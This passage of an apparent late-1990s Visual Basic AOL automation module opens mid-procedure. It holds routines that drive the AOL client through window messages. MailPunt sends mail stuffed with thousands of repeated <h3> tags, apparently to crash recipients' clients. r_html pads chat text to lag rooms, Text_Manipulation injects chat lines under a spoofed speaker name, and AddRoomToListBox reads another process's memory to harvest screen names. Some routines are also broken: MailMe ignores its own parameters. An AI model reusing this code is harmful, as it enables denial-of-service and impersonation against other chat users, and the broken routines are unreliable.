AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
'text1 = Subject Line

'Text1 = Subject Line
'Text2 = Message
Sub MailMe(YourAddressHere, Text1, Text2)

Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub


Sub ShowAOL()
Aol% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(Aol%, 5)
End Sub


Function SNfromIM()

Aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(Aol%, "MDIClient") '

im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(MDI%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(im%)
theSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = theSN$

End Function

Function SNFromLastChatLine()
chattext$ = LastChatLineWithSN
ChatTrim$ = Left$(chattext$, 11)
For z = 1 To 11
    If Mid$(ChatTrim$, z, 1) = ":" Then
        SN = Left$(ChatTrim$, z - 1)
    End If
Next z
SNFromLastChatLine = SN
End Function
Sub StayOnTop(TheForm As Form)
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Sub Text_Manipulation(Who$, wut$)
Aol% = FindWindow("AOL Frame25", 0&)
chatwin% = FindChildByClass(Aol%, "MDIClient")
Blah% = FindChildByClass(chatwin%, "AOL Child")
ChatVew% = FindChildByClass(Blah%, "_AOL_View")
sndtext% = SendMessageByString(ChatVew%, WM_SETTEXT, 0, Chr(13) & Chr(9) & (Who$) & ":" & Chr(9) & (wut$))
SendNow% = SendMessageByNum(ChatVew%, WM_CHAR, &HD, 0)
End Sub

Sub TimeOut(Duration)
starttime = Timer
Do While Timer - starttime < Duration
DoEvents
Loop

End Sub


Sub UnUpchat()
Aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(Aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Upp%, 1)
Call EnableWindow(Aol%, 0)
End Sub

Function r_dots(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + "•"
Let newsent$ = newsent$ + nextChr$
Loop
r_dots = newsent$

End Function

Function r_html(strin As String)
'Returns the strin lagged
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextChr$ = nextChr$ + "<html>"
Let newsent$ = newsent$ + nextChr$
Loop
r_html = newsent$

End Function

Function r_elite(strin As String)
'Returns the strin elite
Let inptxt$ = strin
Let lenth% = Len(inptxt$)

Do While numspc% <= lenth%
DoEvents
Let numspc% = numspc% + 1
Let nextChr$ = Mid$(inptxt$, numspc%, 1)
Let nextchrr$ = Mid$(inptxt$, numspc%, 2)
If nextchrr$ = "ae" Then Let nextchrr$ = "æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let Crapp% = 2: GoTo Greed
If Crapp% > 0 Then GoTo Greed

If nextChr$ = "A" Then Let nextChr$ = "Å"
If nextChr$ = "a" Then Let nextChr$ = "å"
If nextChr$ = "B" Then Let nextChr$ = "ß"
If nextChr$ = "C" Then Let nextChr$ = "Ç"
If nextChr$ = "c" Then Let nextChr$ = "¢"
If nextChr$ = "D" Then Let nextChr$ = "Ð"
If nextChr$ = "d" Then Let nextChr$ = "ð"
If nextChr$ = "E" Then Let nextChr$ = "Ê"
If nextChr$ = "e" Then Let nextChr$ = "è"
If nextChr$ = "f" Then Let nextChr$ = "ƒ"
If nextChr$ = "H" Then Let nextChr$ = "h"
If nextChr$ = "I" Then Let nextChr$ = "‡"
If nextChr$ = "i" Then Let nextChr$ = "î"
If nextChr$ = "k" Then Let nextChr$ = "|‹"
If nextChr$ = "K" Then Let nextChr$ = "(«"
If nextChr$ = "L" Then Let nextChr$ = "£"
If nextChr$ = "M" Then Let nextChr$ = "/\/\"
If nextChr$ = "m" Then Let nextChr$ = "‹v›"
If nextChr$ = "N" Then Let nextChr$ = "/\/"
If nextChr$ = "n" Then Let nextChr$ = "ñ"
If nextChr$ = "O" Then Let nextChr$ = "Ø"
If nextChr$ = "o" Then Let nextChr$ = "ö"
If nextChr$ = "P" Then Let nextChr$ = "¶"
If nextChr$ = "p" Then Let nextChr$ = "Þ"
If nextChr$ = "r" Then Let nextChr$ = "®"
If nextChr$ = "S" Then Let nextChr$ = "§"
If nextChr$ = "s" Then Let nextChr$ = "$"
If nextChr$ = "t" Then Let nextChr$ = "†"
If nextChr$ = "U" Then Let nextChr$ = "Ú"
If nextChr$ = "u" Then Let nextChr$ = "µ"
If nextChr$ = "V" Then Let nextChr$ = "\/"
If nextChr$ = "W" Then Let nextChr$ = "\\'"
If nextChr$ = "w" Then Let nextChr$ = "vv"
If nextChr$ = "X" Then Let nextChr$ = "><"
If nextChr$ = "x" Then Let nextChr$ = "×"
If nextChr$ = "Y" Then Let nextChr$ = "¥"
If nextChr$ = "y" Then Let nextChr$ = "ý"
If nextChr$ = "!" Then Let nextChr$ = "¡"
If nextChr$ = "?" Then Let nextChr$ = "¿"
If nextChr$ = "." Then Let nextChr$ = "…"
If nextChr$ = "," Then Let nextChr$ = "‚"
If nextChr$ = "1" Then Let nextChr$ = "¹"
If nextChr$ = "%" Then Let nextChr$ = "‰"
If nextChr$ = "2" Then Let nextChr$ = "²"
If nextChr$ = "3" Then Let nextChr$ = "³"
If nextChr$ = "_" Then Let nextChr$ = "¯"
If nextChr$ = "-" Then Let nextChr$ = "—"
If nextChr$ = " " Then Let nextChr$ = " "
If nextChr$ = "<" Then Let nextChr$ = "«"
If nextChr$ = ">" Then Let nextChr$ = "»"
If nextChr$ = "*" Then Let nextChr$ = "¤"
If nextChr$ = "`" Then Let nextChr$ = "“"
If nextChr$ = "'" Then Let nextChr$ = "”"
If nextChr$ = "0" Then Let nextChr$ = "º"
Let newsent$ = newsent$ + nextChr$

Greed:
If Crapp% > 0 Then Let Crapp% = Crapp% - 1
DoEvents
Loop
r_elite = newsent$

End Function

Sub MailPunt(Recipiants, Subject, Message)
Aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(Aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
MDI% = FindChildByClass(Aol%, "MDIClient")
AOMail% = FindChildByTitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Text1.Text)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Text2.Text)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>")
Call SendMessageByString(AORich%, WM_SETTEXT, 0, "<h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3><h3>")

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub


Sub Upchat()
Aol% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(Aol%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(Aol%, 1)
Call EnableWindow(Upp%, 0)
End Sub

Function UserSN()
On Error Resume Next
Aol% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(Aol%, "MDIClient")
welcome% = FindChildByTitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
user = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = user
End Function
Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = FindChildByTitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub


Sub WavyChatBlueBlack(thetext)
G$ = thetext
a = Len(G$)
For w = 1 To a Step 4
    r$ = Mid$(G$, w, 1)
    u$ = Mid$(G$, w + 1, 1)
    S$ = Mid$(G$, w + 2, 1)
    T$ = Mid$(G$, w + 3, 1)
    P$ = P$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & u$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next w
SendChat (P$)
End Sub


Sub AddRoomToListBox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear

room = FindChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub


Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListBox(ListBox)
For Q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(Q))
Next Q
End Sub


